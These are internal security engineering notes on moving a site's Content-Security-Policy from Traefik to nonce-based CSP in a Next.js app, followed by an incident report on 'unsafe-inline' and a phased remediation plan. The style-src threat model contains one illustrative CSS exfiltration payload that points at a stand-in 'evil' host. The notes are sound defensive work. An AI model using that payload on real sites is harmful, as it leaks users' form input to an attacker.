### Architectural lessons learned (durable institutional memory)

**1. Traefik `headers.contentSecurityPolicy` is a SET operation, not ADD.**

- The original Phase 2 spec said "split CSP ownership: Traefik = static directives, App = `script-src`". **This is architecturally impossible** with the stock Traefik `secure-headers` middleware. Traefik OVERWRITES the `Content-Security-Policy` header from upstream — the app's attempt to set its own is silently dropped before reaching the browser.
- Verified empirically: PR #323 (dual-header approach) deployed successfully but had zero observable effect on enforcement. Only the `Content-Security-Policy-Report-Only` header (which Traefik doesn't manage) survived end-to-end.
- **For per-request nonce CSP to work, the app MUST own the full `Content-Security-Policy` header.** Traefik's `headers.contentSecurityPolicy` must be dropped entirely (not just edited).

**2. next-themes `scriptProps.nonce` is ignored — use top-level `nonce` prop.**

- `next-themes` ≥ 0.4 exposes both `scriptProps` and a top-level `nonce` prop. The injected pre-hydration `<script>` reads nonce ONLY from the top-level prop.
- Internally: `t.createElement("script", { ...scriptProps, suppressHydrationWarning: true, nonce: typeof window === "undefined" ? topLevelNonce : "", ... })` — the hardcoded `nonce: topLevelNonce` line overrides whatever was in `scriptProps`.
- Caught by Report-Only telemetry on staging; fixed in PR #322. Without the Report-Only soak we would have shipped a broken Phase 4 to production.

**3. Phase 4 must be sequenced: app deploys FIRST, then Traefik drops CSP.**

- Reverse ordering leaves a window with NO CSP at all (Traefik dropped, app not yet deployed). Tested ordering on staging:
  1. Deploy app with full CSP ownership → no observable change (Traefik still wins)
  2. Drop Traefik's `headers.contentSecurityPolicy` entirely → app's CSP becomes the live one
  3. Smoke test
- Failed-ordering rehearsal (the user's first Phase 4 attempt): removed `'unsafe-inline'` from Traefik before app deploy → every inline script blocked → page broke → reverted Traefik.

**4. Empirical truth-test for CSP changes: `curl -sLI <url> | grep -ic '^content-security-policy:'`**

- Should be exactly `1` when one source owns CSP.
- `2` means double-set (Traefik + app, browser intersects them — restrictive).
- `0` means catastrophic gap (no enforcement at all).

### Phase 4C decision: defer indefinitely

`style-src 'unsafe-inline'` migration would touch:

- HeroUI (component library — emits inline styles for variants/states)
- Tailwind v4 runtime (CSS-in-JS for arbitrary values)
- emotion / styled-components (used by some third-party deps)
- framer-motion (emits inline `style="transform: ..."` for animations)

Migration paths considered:

- Per-rule nonce wiring → rarely supported by libraries; would require forks
- `'unsafe-hashes'` + hash pinning → brittle; every CSS-rule change invalidates the hash
- Industry-standard approach → keep `style-src 'unsafe-inline'` and accept the narrow threat surface

Threat model for `style-src 'unsafe-inline'`:

- **Not XSS.** Inline styles can't execute scripts.
- **Narrow exfiltration vector** via CSS attribute selectors (`input[value^="a"] { background: url(evil); }`). Mitigated in practice by HTTPS-only image-src + same-origin form-action.
- **Not credentialed.** Style violations are visual / data-exfil only, not auth-compromise.

**Decision:** accepted residual risk. Revisit only if a specific threat model demands it (e.g., regulator-driven hardening, breach-disclosure-driven policy revision).

## Security Review Incident #10

### Report

Carried forward from incident #7 (PR pending). Surfaced during the production CSP audit on 2026-05-14.

Medium: production CSP includes `script-src 'unsafe-inline'`, which neutralizes the strict-origin script allowlist

- **Where it lives:** Traefik `secure-headers@file` middleware (host-level, outside the repo). Confirmed in production response from `https://experts.com.sa/en/dashboard` on 2026-05-14:

  ```http
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://elu.dev https://static.cloudflareinsights.com
                      https://www.googletagmanager.com https://us-assets.i.posthog.com;
    ...
  ```

- **Why it matters:** `'unsafe-inline'` in `script-src` allows any `<script>...</script>` block (and inline event handlers like `onclick="..."`) to execute. This means any HTML-injection vulnerability — DOM XSS in a rendered field, a missed sanitization, a template-string interpolation that lands user content inside `dangerouslySetInnerHTML`, or even a third-party script being compromised — becomes a full XSS regardless of how strict the origin allowlist looks. The strict origins (`elu.dev`, `static.cloudflareinsights.com`, etc.) provide near-zero protection while `'unsafe-inline'` is present, because attacker-supplied inline scripts bypass the allowlist entirely.

- **Attacker:** any attacker who can land HTML/JS bytes into a rendered surface — comments, post content, course titles, error messages, anywhere `dangerouslySetInnerHTML` is used, or any reflected unescaped value.

- **Reachability:** depends on whether an HTML-injection sink exists. Worth asking qa-tester to enumerate all `dangerouslySetInnerHTML` usages and unescaped template string sites before triaging severity. Even if no injection sink is currently exploitable, `'unsafe-inline'` is a structural weakening that defeats CSP's primary purpose.

- **Standard remediation path (nonce-based CSP):**
  1. Generate a fresh, cryptographically random nonce per request in Next.js middleware (Next.js native pattern, see `docs/app/building-your-application/configuring/content-security-policy.mdx`).
  2. Inject the nonce into the response CSP header: `script-src 'self' 'nonce-{random}' ...`. Remove `'unsafe-inline'`.
  3. Pass the nonce down to every inline `<script>` via the Next.js `Script` component or as the `nonce` attribute on any other inline script tag.
  4. Audit the codebase for inline `<script>` and inline event handlers (`onclick="..."`). Convert them to external scripts or attach nonces.
  5. Roll out behind a `Content-Security-Policy-Report-Only` header first (covered by incident #11) to surface violations from real traffic before enforcing.

- **Why this is its own incident (not a quick fix):**
  - Requires Next.js `proxy.ts` authoring (cross-cuts every response — Next.js 16's renamed `middleware.ts`).
  - Requires identifying and converting every inline `<script>` in the app, including third-party snippets (PostHog, Cloudflare Insights, Google Tag Manager — each has its own nonce/install recipe).
  - Coordination with Traefik: the nonce has to come from the app (per-request), so Traefik can no longer be the sole CSP authority for `script-src`. Either Traefik stops setting CSP and the app takes over, or Traefik sets the static directives (frame-ancestors, base-uri, etc.) and the app supplements per-request directives.
  - Risk of breaking the app on rollout if any inline script is missed.

- **Recommended workstream order:**
  1. Ship incident #11 first (CSP reporting endpoint + small hardening) so violations are visible.
  2. Run Report-Only nonce CSP in staging, watch reports for a week.
  3. Convert all inline scripts. Migrate third-party snippets to nonce-aware loaders.
  4. Enforce in production. Drop `'unsafe-inline'`.

- **Affected files (initial estimate):**
  - `apps/experts-app/proxy.ts` (Next.js 16 renamed `middleware.ts` to `proxy.ts`) — new file, generates per-request nonce.
  - `apps/experts-app/next.config.ts` — coordinate with middleware-set headers vs. config-set headers.
  - Traefik `secure-headers@file` (out-of-repo) — remove `script-src` from CSP or remove CSP entirely; let app own it.
  - Every component that renders an inline `<script>` or inline event handler — likely small list, surfaces via grep for `dangerouslySetInnerHTML` and `<script` and `on*=` patterns.

This is **NOT a surgical fix**. Plan it as a phased migration with explicit Report-Only → Enforce stages.

### Style-src note

Production CSP also includes `style-src 'unsafe-inline'`. This is a less severe weakening (style injection has narrower exploit surface), but is part of the same migration story (Tailwind + emotion-style libraries typically need `'unsafe-inline'` for class generation; nonce migration of styles is a separate, smaller piece of work).

**Recommendation:** address `script-src 'unsafe-inline'` first as a standalone incident. File the `style-src` follow-up if and when the migration succeeds.
